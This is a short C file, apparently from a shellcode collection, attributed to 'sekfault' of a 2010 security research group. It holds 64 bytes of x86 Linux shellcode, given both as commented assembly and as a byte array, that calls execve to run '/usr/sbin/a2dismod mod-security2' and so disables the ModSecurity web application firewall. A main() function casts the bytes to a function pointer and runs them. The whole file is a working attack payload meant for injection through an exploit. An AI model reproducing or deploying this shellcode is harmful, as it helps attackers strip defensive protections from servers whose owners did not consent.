/* sekfault@shellcode.com.ar - Goodfellas Security Research Team - 2010
 * /usr/sbin/a2dismod mod-security2 - disable modsecurity
 * 64 bytes
 *__asm__(
 *                "xor %eax,%eax \n"
 *                 "push %eax \n"
 *                 "cdq \n"
 *                 "push $0x646f6d73 \n"
 *                 "push $0x69643261 \n"
 *                 "push $0x2f6e6962 \n"
 *                 "push $0x732f7273 \n"
 *                 "push $0x752f2f2f \n"
 *                 "mov %esp,%ebx \n"
 *                 "push $0x32 \n"
 *                 "push $0x79746972 \n"
 *                 "push $0x75636573 \n"
 *                 "push $0x2d646f6d \n"
 *                 "mov %esp,%ecx \n"
 *                 "xor %edx,%edx \n"
 *                 "mov $0xb,%al \n"
 *                 "push %edx \n"
 *                 "push %ecx \n"
 *                 "push %ebx \n"
 *                 "mov %esp,%ecx \n"
 *                 "mov %esp,%edx \n"
 *                 "int $0x80 \n"
                   );
 */
char shellcode[]="\x31\xc0\x50\x99\x68\x73\x6d\x6f\x64\x68\x61\x32\x64\x69\x68\x62\x69\x6e\x2f\x68\x73\x72\x2f\x73\x68\x2f\x2f\x2f\x75\x89\xe3\x6a\x32\x68\x72\x69\x74\x79\x68\x73\x65\x63\x75\x68\x6d\x6f\x64\x2d\x89\xe1\x31\xd2\xb0\x0b\x52\x51\x53\x89\xe1\x89\xe2\xcd\x80";

int main()
{
        (*(void(*)())shellcode)();
        return 0;
}